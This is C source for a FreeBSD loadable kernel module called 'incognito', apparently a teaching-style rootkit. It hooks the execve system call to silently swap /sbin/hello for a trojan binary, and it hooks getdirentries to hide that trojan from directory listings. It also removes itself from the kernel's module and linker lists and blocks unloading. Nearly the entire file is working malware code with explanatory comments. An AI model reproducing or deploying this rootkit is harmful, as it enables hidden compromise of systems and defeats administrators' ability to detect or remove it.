#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/dirent.h>
#include <sys/malloc.h>
#include <sys/linker.h>
#include <sys/sysproto.h>
#include <sys/lock.h>
#include <sys/mutex.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#define ORIGINAL	"/sbin/hello"
#define TROJAN		"/sbin/trojan_hello"
#define T_NAME		"trojan_hello"
#define VERSION		"incognito-0.3.ko"

/* The following is the list of variables that you need to
 * reference in order to hide this module, which aren't defined
 * in any header files */
extern linker_file_list_t linker_files;
extern int next_file_id;
//static struct sx kld_sx;
static TAILQ_HEAD(modulelist, module) modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module)	link;	/* chain together all modules */
	TAILQ_ENTRY(module)	flink;	/* all modules in a file */
	struct linker_file	*file;	/* file which contains this module */
	int			refs;	/* reference count */
	int			id;	/* unique id number */
	char			*name;	/* module name */
	modeventhand_t		handler;/* event handler */
	void			*arg;	/* argument for handler */
	modspecific_t		data;	/* module specific data */
};

/* sys_execve syscall hook */
/* Redirects the execution of ORIGINAL into TROJAN */
static int execve_hook( struct thread *td, void *syscall_args)
{
	struct execve_args /* {
		char *fname;
		char **argv;
		char **envv;
	} */ *uap;
	uap = (struct execve_args *)syscall_args;

	struct execve_args kernel_ea;
	struct execve_args *user_ea;
	struct vmspace *vm;
	vm_offset_t base, addr;
	char t_fname[] = TROJAN;

	/* Check if we want to redirect this process */
	if (strcmp(uap->fname, ORIGINAL) == 0)
	{
		/* Determine the end boundary address of the current 
		 * process's user data space */
		vm = curthread->td_proc->p_vmspace;
		base = round_page((vm_offset_t) vm->vm_daddr);
		/* If fname is "/sbin/hello", then we store the end boundary address of the current process's user data space in addr */
		addr = base + ctob(vm->vm_dsize);

		/* Allocate a PAGE_SIZE null region of memory for w
		 * new set of execve arguments */
		/* vm_map_find() will map a PAGE_SIZE block of NULL memory at the location we stored in addr. This will allow us to store the arguments passed to the process in userland */
		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, 0, FALSE, VM_PROT_ALL, VM_PROT_ALL, 0);
		vm->vm_dsize += btoc(PAGE_SIZE);

		/* Set up an execve_args structure for TROJAN. Remeber, you
		 * have to set place this structure into user space, and 
		 * because you can't point to an element in kernel space once
		 * you are in user space, you'll have to play any new "arrays" that
		 * this structure points to in user space as well. */
		/* We have to mimic the argument structure that the real SYS_execve expects */
		copyout(&t_fname, (char *)addr, strlen(t_fname));
		kernel_ea.fname = (char *)addr;
		kernel_ea.argv	= uap->argv;
		kernel_ea.envv	= uap->envv;

		/* Copy out the TROJAN execve_args structure */
		user_ea = (struct execve_args *)addr + sizeof(t_fname);
		/* Store the argument structure in the allocated memory space (addr) */
		copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

		/* Execute TROJAN */
		return (sys_execve(curthread, user_ea));
	}

	return (sys_execve(td, syscall_args));
}

/* getdirentries system call hook */
/* Hide the file T_NAME */
static int getdirentries_hook (struct thread *td, void *syscall_args)
{
	struct getdirentries_args /* {
		int fd;
		char *buf;
		u_int count;
		long *basep;
	} */ *uap;
	uap = (struct getdirentries_args *)syscall_args;

	struct dirent *dp, *current;
	unsigned int size, count;

	/* Store the directory entries found in fd in buf, and record the number
	 * of bytes actually transferred. We have to use the real sys_getdirentries
	 * to achieve this.*/
	sys_getdirentries(td, syscall_args);
	size = td->td_retval[0];

	/* Does fd actually contain any directory entries */
	/* If fd doesn't contain any entries, then the return value is -1 */
	if (size > 0)
	{
		dp = (struct dirent *) malloc( size, M_TEMP, M_NOWAIT);
		/* The contents of buf are dirent structures */
		copyin(uap->buf, dp, size);

		current = dp;
		count = size;

		/* Iterate through the directory entries found in fd/
		 * Note: The last directory entry always has a record length
		 * of zero */
		while ((current->d_reclen != 0) && (count > 0))
		{
			count -= current->d_reclen;

			/* Do we want to hide this file? */
			/* current->d_name is the filename of each entry */
			if (strcmp((char *)&(current->d_name), T_NAME) == 0)
			{
				/* Copy every directory found after T_NAME over
				 * T_NAME, effectively cutting it out */
				if (count != 0)
					/* Copy the remainder of the dirent structures to buf */
					bcopy((char *)current +
							current->d_reclen, current,
							count);

				size -= current->d_reclen;
				break;
			}

			/* Are there still more directories to look through? */
			if (count != 0)
				/* Advanced to the next record */
				current = (struct dirent *)((char *) current +
						current ->d_reclen);
		}

		/* If T_NAME was found in fd, adjust the "return values" to hide it.
		 * If T_NAME wasn't found...don't worry about it. */
		/* Adjust the return value (number of bytes transferred) */
		td->td_retval[0] = size;
		/* Copy the buffer back out to userspace */
		copyout(dp, uap->buf, size);

		free(dp, M_TEMP);
	}

	return(0);
}

/* The function called at load/unload */
static int load (struct module *module, int cmd, void *arg)
{

	int error = 0;

	switch(cmd)
	{
		case MOD_LOAD:
			sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

			struct linker_file *lf;
			struct module *mod;

			mtx_lock(&Giant);

			/* Decrement the current kernel image's 
			 * reference count */
			(&linker_files)->tqh_first->refs--;

			/* Iterate through the linker_files list, 
			 * looking for VERSION.
	 		* If found decrement next_file_id and remove 
			* from list */
			TAILQ_FOREACH(lf, &linker_files, link)
			{
				if (strcmp(lf->filename, VERSION) == 0)
				{
					next_file_id--;
					TAILQ_REMOVE(&linker_files, lf, link);
					break;
				}
			}				

			mtx_unlock(&Giant);

			sx_xlock(&modules_sx);

			/* Iterate through the modules list, looking 
			 * for "incognito". If found, decrement nextid 
			 * and remove from list */
			TAILQ_FOREACH(mod, &modules, link)
			{
				if (strcmp(mod->name, "incognito") == 0)
				{
					nextid--;
					TAILQ_REMOVE(&modules, mod, link);
					break;
				}
			}

			sx_xunlock(&modules_sx);
			break;

		case MOD_UNLOAD:
			printf("Uh, uh, uh! You didn't say the magic word!\n");
			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return(error);
}

static moduledata_t incognito_mod = {
	"incognito",		/* module name */
	load, 			/* event handler */
	NULL
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
